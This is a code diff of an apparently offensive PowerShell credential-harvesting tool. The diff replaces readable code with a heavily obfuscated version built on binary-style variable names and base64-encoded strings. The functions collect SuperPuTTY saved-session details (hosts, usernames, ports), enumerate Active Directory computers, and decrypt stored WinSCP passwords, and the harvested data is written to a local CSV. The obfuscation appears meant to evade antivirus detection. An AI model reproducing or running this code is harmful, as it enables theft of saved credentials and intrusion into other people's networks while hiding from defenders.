+function _01110101110100101(${_10100100011100010}) { foreach(${10001100100011111} in ${_10100100011100010}.ArrayOfSessionData.SessionData) { foreach (${00010100011000001} in 
+    ${10001100100011111}) {
+      if (${00010100011000001} -ne $null) { ${10010101000001111} = "" | select -Property 
+        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAHUAcgBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBJAGQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBOAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABvAHMAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAcgBhAEEAcgBnAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHIAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AHQAdAB5ACAAUwBlAHMAcwBpAG8AbgA='))) 
+        ${10010101000001111}."Source" = ${00111110011110111} ${10010101000001111}."SessionId" = ${00010100011000001}.SessionId ${10010101000001111}."SessionName" = 
+        ${00010100011000001}.SessionName ${10010101000001111}."Host" = ${00010100011000001}.Host ${10010101000001111}."Username" = ${00010100011000001}.Username 
+        ${10010101000001111}."ExtraArgs" = ${00010100011000001}.ExtraArgs ${10010101000001111}."Port" = ${00010100011000001}.Port ${10010101000001111}."PuTTY Session" = 
+        ${00010100011000001}.PuttySession [void]${01010111100000001}.Add(${10010101000001111})
       } 
     }
-
-  } # ForEach SuperPuTTYSessions
-
-  if ($o) {
-    $muzrifeMsMRPGSl | Export-CSV -Append -Path ($zPRwy9FdrtsVRzg + "\SuperPuTTY.csv") -NoTypeInformation
+  } 
+  if ($o) { ${01010111100000001} | Export-CSV -Append -Path (${10101001001011011} + 
+    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABTAHUAcABlAHIAUAB1AFQAVABZAC4AYwBzAHYA')))) -NoTypeInformation
   } else {
-    Write-Output "SuperPuTTY Sessions"
-    $muzrifeMsMRPGSl | Out-String
+    echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AHAAZQByAFAAdQBUAFQAWQAgAFMAZQBzAHMAaQBvAG4AcwA='))) ${01010111100000001} | Out-String
   }
-
-
-  $V9joSisJDLQPInP | Add-Member -MemberType NoteProperty -Name "SuperPuTTY Sessions" -Value $muzrifeMsMRPGSl
-
-} # ProcessSuperPuTTYFile
-
-
-
-
-
-
-
-
-function antivirals {
-
-  $MrTg9cPVNelZ99s = "computer"
-  $rmh9BwAZMjeo9wW = New-Object System.DirectoryServices.DirectoryEntry
-  $mdEsFuDcLgbHjkl = New-Object System.DirectoryServices.DirectorySearcher
-  $mdEsFuDcLgbHjkl.SearchRoot = $rmh9BwAZMjeo9wW
-  $mdEsFuDcLgbHjkl.Filter = ("(objectCategory=$MrTg9cPVNelZ99s)")
-
-  $YXrlxH9EOqo9FPe = "name"
-
-  foreach ($i in $YXrlxH9EOqo9FPe){$mdEsFuDcLgbHjkl.PropertiesToLoad.Add($i)}
-
-  return $mdEsFuDcLgbHjkl.FindAll()
-
+  ${10000100110110100} | Add-Member -MemberType NoteProperty -Name 
+  $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AHAAZQByAFAAdQBUAFQAWQAgAFMAZQBzAHMAaQBvAG4AcwA='))) -Value ${01010111100000001}
+} 
+function _01000111000111100 { ${01110000100101010} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAG0AcAB1AHQAZQByAA=='))) ${10111000000111010} = 
+  New-Object System.DirectoryServices.DirectoryEntry ${10110010011011101} = New-Object System.DirectoryServices.DirectorySearcher ${10110010011011101}.SearchRoot = 
+  ${10111000000111010} ${10110010011011101}.Filter = 
+  ($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGEAdABlAGcAbwByAHkAPQAkAHsAMAAxADEAMQAwADAAMAAwADEAMAAwADEAMAAxADAAMQAwAH0AKQA=')))) 
+  ${10011010000111100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBhAG0AZQA='))) foreach (${00010001010111100} in 
+  ${10011010000111100}){${10110010011011101}.PropertiesToLoad.Add(${00010001010111100})} return ${10110010011011101}.FindAll()
 }
-
-function DecryptNextCharacterWinSCP($VlLSIbZJbTFAVBY) {
-
-
-  $OA9TNnAwFhcVguW = "" | Select-Object -Property flag,remainingPass
-
-
-  $m9b9TENx9cEPdwE = ("0123456789ABCDEF".indexOf($VlLSIbZJbTFAVBY[0]) * 16)
-  $MA9BG9VaxNPDOwp = "0123456789ABCDEF".indexOf($VlLSIbZJbTFAVBY[1])
-
-  $Added = $m9b9TENx9cEPdwE + $MA9BG9VaxNPDOwp
-
-  $ykeyHBRM9ljjHYW = (((-bnot ($Added -bxor $Magic)) % 256) + 256) % 256
-
-  $OA9TNnAwFhcVguW.flag = $ykeyHBRM9ljjHYW
-  $OA9TNnAwFhcVguW.remainingPass = $VlLSIbZJbTFAVBY.Substring(2)
-
-  return $OA9TNnAwFhcVguW
-
+function _00010111111110011(${_00100100000111110}) { ${01100010100111010} = "" | select -Property flag,remainingPass ${00010101100011100} = 
+  ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAxADIAMwA0ADUANgA3ADgAOQBBAEIAQwBEAEUARgA='))).indexOf(${_00100100000111110}[0]) * 16) 
+  ${01110111011100010} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAxADIAMwA0ADUANgA3ADgAOQBBAEIAQwBEAEUARgA='))).indexOf(${_00100100000111110}[1]) 
+  ${01110011011111111} = ${00010101100011100} + ${01110111011100010} ${11000001000011001} = (((-bnot (${01110011011111111} -bxor ${01000110011100100})) % 256) + 256) % 256 
+  ${01100010100111010}.flag = ${11000001000011001} ${01100010100111010}.remainingPass = ${_00100100000111110}.Substring(2) return ${01100010100111010}
 }
-
-function DecryptWinSCPPassword($pMagHowSYYxUOt9, $CFOMswWzeftCiiV, $fGXVxzAmP9cBYAr) {
-
-  $tgzYLzOZIIuOZDx = 255
-  $Magic = 163
-
-  $len = 0
-  $key =  $pMagHowSYYxUOt9 + $CFOMswWzeftCiiV
-  $AnNcdMN9byyA9yU = DecryptNextCharacterWinSCP($fGXVxzAmP9cBYAr)
-
-  $KPnpMkxBMzVdcZC = $AnNcdMN9byyA9yU.flag 
-
-  if ($AnNcdMN9byyA9yU.flag -eq $tgzYLzOZIIuOZDx) {
-    $AnNcdMN9byyA9yU.remainingPass = $AnNcdMN9byyA9yU.remainingPass.Substring(2)
-    $AnNcdMN9byyA9yU = DecryptNextCharacterWinSCP($AnNcdMN9byyA9yU.remainingPass)
+function _00111011011010000(${_01101100100101000}, ${_10110110000001101}, ${_10001001010100011}) { ${10111111100110001} = 255 ${01000110011100100} = 163 ${01011000001111101} = 
+  0 ${00011010010010111} = ${_01101100100101000} + ${_10110110000001101} ${01001110011001000} = _00010111111110011(${_10001001010100011}) ${00111110010101001} = 
+  ${01001110011001000}.flag if (${01001110011001000}.flag -eq ${10111111100110001}) {
+    ${01001110011001000}.remainingPass = ${01001110011001000}.remainingPass.Substring(2) ${01001110011001000} = _00010111111110011(${01001110011001000}.remainingPass)
   }
-
-  $len = $AnNcdMN9byyA9yU.flag
-
-  $AnNcdMN9byyA9yU = DecryptNextCharacterWinSCP($AnNcdMN9byyA9yU.remainingPass)
-  $AnNcdMN9byyA9yU.remainingPass = $AnNcdMN9byyA9yU.remainingPass.Substring(($AnNcdMN9byyA9yU.flag * 2))
-
-  $RzKPAdF9Exc9FnK = ""
-  for ($i=0; $i -lt $len; $i++) {
-    $AnNcdMN9byyA9yU = (DecryptNextCharacterWinSCP($AnNcdMN9byyA9yU.remainingPass))
-    $RzKPAdF9Exc9FnK += [char]$AnNcdMN9byyA9yU.flag
+  ${01011000001111101} = ${01001110011001000}.flag ${01001110011001000} = _00010111111110011(${01001110011001000}.remainingPass) ${01001110011001000}.remainingPass = 
+  ${01001110011001000}.remainingPass.Substring((${01001110011001000}.flag * 2)) ${10101101110100001} = "" for (${00010001010111100}=0; ${00010001010111100} -lt 
+  ${01011000001111101}; ${00010001010111100}++) {
+    ${01001110011001000} = (_00010111111110011(${01001110011001000}.remainingPass)) ${10101101110100001} += [char]${01001110011001000}.flag
   }
-
-  if ($KPnpMkxBMzVdcZC -eq $tgzYLzOZIIuOZDx) {
-    return $RzKPAdF9Exc9FnK.Substring($key.length)
+  if (${00111110010101001} -eq ${10111111100110001}) { return ${10101101110100001}.Substring(${00011010010010111}.length)
   }
-
-  return $RzKPAdF9Exc9FnK
-
+  return ${10101101110100001}
 }
